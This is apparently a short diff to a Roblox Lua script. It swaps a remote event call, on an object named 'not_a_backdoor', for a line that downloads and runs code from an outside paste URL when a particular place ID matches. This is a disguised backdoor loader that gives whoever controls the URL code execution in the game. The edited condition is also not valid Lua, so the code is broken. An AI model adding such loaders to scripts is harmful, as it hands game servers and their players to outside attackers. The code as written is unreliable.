@@ -1,6 +1,6 @@
-if placeid == 8627832190
-then
+if placeid == 8627832190 is true then
     print("succes")
-    game.Workspace.not_a_backdoor.uwu:FireServer("")
+    loadstring(game:HttpGet(('https://darkwoid.tk/pastes/JustJinxSS'),true)())
 else
-    print("fail")
+    error("fail")
+end
